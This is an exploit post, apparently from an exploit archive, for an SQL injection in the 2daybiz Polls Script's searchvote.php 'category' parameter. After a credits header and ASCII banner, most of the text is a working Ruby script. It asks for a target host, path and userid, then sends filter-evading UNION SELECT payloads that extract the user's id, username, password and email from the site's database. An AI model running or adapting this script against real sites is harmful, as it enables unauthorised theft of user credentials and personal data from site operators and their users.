----------------------------Information------------------------------------------------
+Autor : Easy Laster
+ICQ : 11-051-551
+Info : http://www.2daybiz.com/polls_script.html
+Discovered by Easy Laster 4004-security-project.com
+Security Group Undergroundagents and 4004-Security-Project 4004-security-project.com
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox.
   
---------------------------------------------------------------------------------------
                                                                                       
___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|         
   
   
----------------------------------------------------------------------------------------
+Vulnerability : www.site.com/script/searchvote.php?category=
----------------------------------------------------------------------------------------
+exploit in ruby

#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
#             2daybiz Polls Script SQL Injection        #
#                    Vulnerability Exploit              #
#                    Using Host+Path+userid             #
#                      demo.com /script/ 1              #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/script/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
begin
dir = "searchvote.php?category=%27+/**/uNiOn+/**/SeLeCt+1,2,3,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/**/fRoM/**/home_table/**/wHeRe/**/id="+ userid +"/**/--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchvote.php?category=%27+/**/uNiOn+/**/SeLeCt+1,2,3,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/**/fRoM/**/home_table/**/wHeRe/**/id="+ userid +"/**/--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe username is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchvote.php?category=%27+/**/uNiOn+/**/SeLeCt+1,2,3,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,password,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/**/fRoM/**/home_table/**/wHeRe/**/id="+ userid +"/**/--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "searchvote.php?category=%27+/**/uNiOn+/**/SeLeCt+1,2,3,GrOuP_CoNcAt(0x23,0x23,0x23,0x23,0x23,Mail_id,0x23,0x23,0x23,0x23,0x23),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/**/fRoM/**/home_table/**/wHeRe/**/id="+ userid +"/**/--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe Email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end